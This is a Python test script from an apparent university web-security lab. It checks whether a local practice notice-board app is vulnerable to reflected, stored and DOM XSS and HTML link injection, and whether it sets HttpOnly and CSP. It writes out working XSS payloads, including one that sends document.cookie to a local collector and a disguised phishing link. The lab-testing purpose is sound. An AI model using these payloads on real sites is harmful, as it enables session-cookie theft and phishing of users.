"""Test ladunkow XSS dla laboratorium 6 - Tablica ogloszen.

Uruchamiaj WYLACZNIE przeciwko lokalnej, cwiczeniowej aplikacji z pakietu.
Ladunki sa nieszkodliwe: zmieniaja tlo/tytul strony lub wysylaja dane do
lokalnego zbieracza (http://localhost:8081). Skrypt sprawdza po stronie serwera,
czy ladunek wraca niezakodowany (podatnosc) czy jako tekst (naprawione).

Uzycie:
    python test_xss.py                      # testuje http://127.0.0.1:8080
    python test_xss.py http://127.0.0.1:18080

DOM XSS z zadania 3 (/podglad#...) wykonuje sie w przegladarce - skrypt podaje
gotowy adres do recznego sprawdzenia w DevTools.
"""
import sys
import urllib.request
import urllib.parse
import http.cookiejar

BAZA = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://127.0.0.1:8080"
ZBIERACZ = "http://localhost:8081"

OK = "FIXED   "
ZLE = "VULN    "


class BezRedirectow(urllib.request.HTTPRedirectHandler):
    """Nie podaza za 302, zeby zachowac naglowek Set-Cookie z odpowiedzi."""
    def redirect_request(self, *a, **k):
        return None


def otworz(sciezka, dane=None, cookiejar=None, sledz_redirect=True):
    """Zwraca (status, naglowki, tresc) dla GET/POST."""
    url = BAZA + sciezka
    if dane is not None:
        dane = urllib.parse.urlencode(dane).encode()
    req = urllib.request.Request(url, data=dane)
    handlers = [urllib.request.HTTPRedirectHandler() if sledz_redirect else BezRedirectow()]
    if cookiejar is not None:
        handlers.append(urllib.request.HTTPCookieProcessor(cookiejar))
    opener = urllib.request.build_opener(*handlers)
    try:
        with opener.open(req, timeout=5) as r:
            return r.status, dict(r.headers), r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read().decode("utf-8", "replace")


def zaloguj(login, haslo):
    cj = http.cookiejar.CookieJar()
    otworz("/logowanie", {"login": login, "haslo": haslo}, cookiejar=cj)
    return cj


def setcookie_logowania(login, haslo):
    _, naglowki, _ = otworz("/logowanie", {"login": login, "haslo": haslo},
                            sledz_redirect=False)
    return naglowki.get("Set-Cookie", "")


def zad1_odbity():
    print("\n== Zadanie 1: XSS odbity (/szukaj?q=) ==")
    ladunek = "<script>document.body.style.background='red';document.title='XSS-odbity'</script>"
    q = urllib.parse.quote(ladunek)
    print("Adres:", BAZA + "/szukaj?q=" + q)
    _, _, tresc = otworz("/szukaj?q=" + q)
    podatny = ladunek in tresc
    print((ZLE if podatny else OK) + "surowy <script> w odpowiedzi:", podatny)
    # kontrola dzialania: zwykle slowo nadal znajduje wpis
    _, _, t2 = otworz("/szukaj?q=konsultacje")
    print("          wyszukiwanie 'konsultacje' dziala:", "Konsultacje w pi" in t2)
    return not podatny


def zad2_zapisany():
    print("\n== Zadanie 2: XSS zapisany + ciasteczko ==")
    ladunek = ("<img src=x onerror=\"new Image().src='" + ZBIERACZ +
               "/?c='+encodeURIComponent(document.cookie)\">")
    cj = zaloguj("student", "student-lab6")
    otworz("/dodaj", {"tresc": ladunek}, cookiejar=cj)
    _, _, tresc = otworz("/")
    podatny = "onerror=" in tresc and "&lt;img" not in tresc
    print("Ladunek:", ladunek)
    print((ZLE if podatny else OK) + "ladunek na tablicy niezakodowany:", podatny)
    sc = setcookie_logowania("anna", "anna-lab6")
    httponly = "httponly" in sc.lower()
    print(("FIXED   " if httponly else "VULN    ") + "Set-Cookie ma HttpOnly:", httponly)
    print("          Set-Cookie:", sc or "(brak)")
    return (not podatny) and httponly


def zad3_csp_dom():
    print("\n== Zadanie 3: CSP + DOM XSS ==")
    _, naglowki, _ = otworz("/")
    csp = naglowki.get("Content-Security-Policy")
    print(("FIXED   " if csp else "VULN    ") + "naglowek CSP:", csp or "(brak)")
    ladunek = "<img src=x onerror=document.title='XSS-DOM'>"
    print("DOM (sprawdz recznie w przegladarce, tytul karty ma NIE zmienic sie na XSS-DOM):")
    print("   ", BAZA + "/podglad#" + urllib.parse.quote(ladunek))
    return bool(csp)


def zad_wstrzykniecie_linku():
    print("\n== Dodatkowo: wstrzykniecie linku (HTML injection, bez JS) ==")
    # Zwodniczy link: widoczny tekst mowi "dobra strona", a href prowadzi gdzie indziej.
    # Nie potrzebuje JavaScriptu, wiec HttpOnly i CSP go nie blokuja - tylko kodowanie wyjscia.
    ladunek = '<a href="' + ZBIERACZ + '/?phish=1">link do dobrej strony</a>'
    cj = zaloguj("student", "student-lab6")
    otworz("/dodaj", {"tresc": ladunek}, cookiejar=cj)
    _, _, tresc = otworz("/")
    podatny = ladunek in tresc            # surowy <a href...> = klikalny link u innych
    zakodowany = "&lt;a href" in tresc    # po naprawie: doslowny tekst
    print("Ladunek:", ladunek)
    print((ZLE if podatny else OK) + "surowy klikalny <a> na tablicy:", podatny)
    print("          ladunek zakodowany jako tekst:", zakodowany)
    return not podatny


def main():
    print("Cel:", BAZA, "| zbieracz:", ZBIERACZ)
    try:
        otworz("/")
    except Exception as e:
        print("Nie moge polaczyc sie z aplikacja:", e)
        print("Uruchom: docker compose up -d  (w katalogu pliki-dla-studentow)")
        return 2
    wyniki = [zad1_odbity(), zad2_zapisany(), zad3_csp_dom(), zad_wstrzykniecie_linku()]
    print("\n== Podsumowanie ==")
    print("Zad1:", "OK" if wyniki[0] else "PODATNE",
          "| Zad2:", "OK" if wyniki[1] else "PODATNE",
          "| Zad3(CSP):", "OK" if wyniki[2] else "PODATNE",
          "| Link:", "OK" if wyniki[3] else "PODATNE")
    print("DOM XSS potwierdz w przegladarce (DevTools). Po naprawie tytul karty sie nie zmienia.")
    return 0 if all(wyniki) else 1


if __name__ == "__main__":
    sys.exit(main())
